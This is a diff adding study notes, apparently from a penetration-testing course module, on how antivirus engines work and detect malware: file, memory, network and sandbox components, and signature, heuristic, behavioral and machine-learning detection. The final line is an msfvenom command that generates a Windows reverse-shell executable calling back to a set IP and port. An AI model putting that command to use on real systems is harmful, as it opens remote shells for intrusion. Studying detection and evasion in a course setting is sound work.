@@ -1,0 +1,62 @@
+## Known vs Unknown Threats
+
+- VirusTotal
+	- malware search engine
+  - adds signatures to database [thats a bad thing]
+- Usually have ML Engine
+	- must be connected online
+- EDR (Endpoint Detation and Response)
+	- Responsible for generating security-event telemetry and forwarding it to a _Security Information and Event Management_ (SIEM)[6](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/antivirus-evasion/antivirus-software-key-components-and-operations/known-vs-unknown-threats#fn6) system, which collects data from every company host.
+
+### AV Engines and Components
+- fueled by signature updates fetched from the vendors signature database on the internet.
+- Components
+	- File Engine
+		- scheduled and real-time file scans
+		- real time requires kernel level scanner via mini-filter driver
+	- Memory Engine
+		- each process's memory space at runtime or suspicious API calls that might result in memory injection attacks
+	- Network Engine
+		- incoming/outgoing network traffic
+		- if signature matched, might attempt to block malware C2
+	- Disassembler
+		- if trying to encrypt malware, AV can disassembling malware packers or ciphers & loading into sandbox or emulator
+		- translate machine code into assembly language, reconstructing the orignal program section, and identifying any encoding/decoding routine
+	- Emulator/Sandbox
+		- runs malware to detect signatures
+	- Browser Plugin
+		- to detect malware that might be executed in the browser (Sandboxed)
+	- Machine Learning Engine
+		- in the cloud
+
+### Detection Methods
+- Signature-based Detection
+	- restricted list technology
+		- file system is scanned for known malware signatures, if detected, files are quarantined
+		- signature can be just as simple as the hash of the file itself or a set of multiple patterns
+		- Example:
+			- xxd -b malware.txt
+			- ```
+kali@kali:~$ xxd -b malware.txt
+00000000: 01101111 01100110 01100110 01110011 01100101 01100011  offsec
+00000006: 00001010    
+``
+- xxd
+	- left = binary offset, middle = binary representation, right = ASCII
+	- sha256sum malware.txt
+- Heuristic-based Detection
+	- relies on various rules and algorithms to determine whether or not an action is considered malicious
+	- achieved by stepping through the instruction set of a binary file or by attempting to disassemble the machine code and ultimately decompile and analyze the source code
+	- search for various patterns and program calls (as opposed to simple byte sequences) that are considered malicious.
+- Behavioral Detection
+	- dynamically analyzes the behavior of a binary file
+	- often achieved by executing the file in question in an emulated environment,and searching for behaviors or actions that are considered malicious.
+- Machine Learning Detection
+	- detect unknown threats by collecting and analyzing additional metadata.
+	- Microsft Windows Defender
+		- client ML Engine
+			- creating ML models and heuristics
+		- cloud ML engine
+			- capable of analyzing the submitted sample against a metadata-based model comprised of all the submitted samples.
+- Windows msfvenom example
+	- msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.205 LPORT=5555 -f exe > binary.exe
